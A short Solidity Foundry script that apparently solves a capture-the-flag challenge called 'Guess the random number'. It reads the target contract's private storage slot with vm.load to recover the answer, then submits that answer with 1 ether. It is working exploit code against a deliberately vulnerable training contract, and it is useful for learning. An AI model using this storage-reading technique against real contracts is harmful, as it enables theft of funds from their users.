// SPDX-License-Identifier: MIT
pragma solidity ^0.8.13;

import "forge-std/Script.sol";
import "./IGuess.sol";

contract GuessTheRandomNumberSolution is Script {
    IGuess private guessTheRandomNumber = IGuess(vm.envAddress("ADDRESS"));
    uint8 answer;

    function setUp() public {
        answer = uint8(uint256(vm.load(address(guessTheRandomNumber), 0)));
        console.log(answer);
    }

    function run() public {
        vm.broadcast();
        guessTheRandomNumber.guess{value: 1 ether}(answer);
        require(guessTheRandomNumber.isComplete());
    }
}
